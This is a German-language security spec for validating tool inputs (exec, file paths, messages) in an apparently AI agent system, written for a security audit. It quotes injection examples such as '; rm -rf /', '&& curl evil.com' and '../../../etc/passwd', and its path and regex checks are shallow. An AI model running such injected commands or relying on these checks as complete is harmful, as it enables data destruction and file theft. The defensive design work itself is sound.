# Tool Input Validation Spec

**Version:** 1.0  
**Datum:** 2026-04-08  
**Status:** Implementiert durch Builder  
**Referenz:** Security Audit #2

---

## Overview

Diese Spezifikation definiert einen Validation-Layer für alle Tool-Inputs im OpenClaw-System. Ziel ist die Verhinderung von:
- Command Injection
- Path Traversal
- XSS Content Injection

---

## Validated Tools

### 1. exec Tool

**Risiko:** Command Injection (`; rm -rf /`, `&& curl evil.com`, etc.)

**Erlaubte Zeichen:**
- Alphanumeric: `a-zA-Z0-9`
- Dashes: `-`
- Underscores: `_`
- Spaces: ` ` (fürArg-Parsing)
- Slashes: `/` (für Pfade)
- Dots: `.` (für Dateinamen wie `app.js`)

**Verbotene Zeichen:**
- Semicolons: `;`
- Pipes: `|`
- Ampersands: `&`
- Dollar Signs: `$`
- Backticks: `` ` ``
- Dollar-Parentheses: `$()`
- Newlines: `\n`, `\r`
- Quotes (ohne Escaping-Kontext): `'`, `"`

**Validation Regex:**
```regex
^[a-zA-Z0-9_\-\/\s.\[\]（）\(\)]+$
```

**Whitelist-Ansatz:** Nur explizit erlaubte Zeichen.

---

### 2. write/edit Tool

**Risiko:** Path Traversal (`../../../etc/passwd`)

**Erlaubt:**
- Relative Pfade: `scripts/app.js`, `memory/notes/readme.md`
- Nur alphanumerische Verzeichnis-/Dateinamen

**Verboten:**
- Absolute Pfade: `/etc/passwd`, `C:\Windows`
- Parent Traversal: `..`
- Home-Tilde ohne Kontrolle: `~/.ssh`
- Symlink-Umgehung: Pfade die ausserhalb des Workspaces zeigen

**Validation:**
```javascript
function validateWritePath(path) {
  // Keine absoluten Pfade
  if (path.startsWith('/')) return false;
  
  // Keine Parent-Traversal
  if (path.includes('..')) return false;
  
  // Keine Tilde (ohne explizite Erlaubnis)
  if (path.startsWith('~')) return false;
  
  return true;
}
```

---

### 3. read Tool

**Risiko:** Path Traversal (gleiche Regeln wie write/edit)

**Validation:** Identisch mit write/edit.

---

### 4. message Tool

**Risiko:** XSS via Content Injection, Markdown-Injection

**Erlaubter Content:**
- Plain Text
- Markdown (eingeschränkt)
- Kein HTML

**Verboten:**
- HTML-Tags: `<script>`, `<iframe>`, `<img>`
- JavaScript-URIs: `javascript:`
- Data-URIs mit Scripts

**Validation:**
```javascript
function validateMessageContent(content) {
  // Kein HTML
  if (/<script/i.test(content)) return false;
  if (/<iframe/i.test(content)) return false;
  if (/javascript:/i.test(content)) return false;
  if (/data:/i.test(content)) return false;
  
  return true;
}
```

---

## Implementierung

**Datei:** `/home/clawbot/.openclaw/workspace/builder/input_validation.js`

Diese Datei enthält die Referenz-Implementierung des Validation Layers.

---

## Integration

Der Validation Layer sollte:
1. **Vor jedem Tool-Call** aufgerufen werden
2. Bei Validierungsfehler: **Reject** mit sicherer Fehlermeldung
3. Logs für Security-Monitoring schreiben (ohne sensitive Daten)

---

*Erstellt: 2026-04-08 — Builder für Security Officer Audit #2*
